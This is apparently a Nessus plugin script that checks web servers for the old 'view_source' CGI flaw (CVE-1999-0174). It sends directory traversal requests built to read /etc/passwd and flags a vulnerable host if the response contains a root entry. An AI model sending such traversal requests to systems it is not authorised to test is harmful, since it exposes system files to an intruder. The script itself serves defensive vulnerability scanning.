#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#
# MA added an Apache2 vulnerability
# http://secunia.com/advisories/10064/
#

if(description)
{
 script_id(10294);
 script_bugtraq_id(2251);
 script_version ("$Revision: 1.31 $");
 script_cve_id("CVE-1999-0174");
 
 name["english"] = "view_source";
 name["francais"] = "view_source";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'view_source' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'view_source' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
lire des fichiers arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/view_source";
 summary["francais"] = "Vérifie la présence de /cgi-bin/view_source";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
no404 = get_kb_item(string("www/no404/", port));
if (no404)
  exit(0);

if(!get_port_state(port))exit(0);

i = 0;
pat[i++] = "filename=";
pat[i++] = "";

i = 0;
rel[i++] = "../../../../../../../../..";
rel[i++] = "";

foreach dir (cgi_dirs())
 foreach r (rel)
  foreach p (pat)
  {
   data = http_get(item:string(dir, "/view_source?", p, r, "/etc/passwd"), port:port);
   buf = http_keepalive_send_recv(data:data, port:port);
   if(isnull(buf)) exit(0);

if(egrep(pattern:"root:.*:0:[01]:.*", string:buf)){
  	security_hole(port);
  	exit(0);
	}
   }
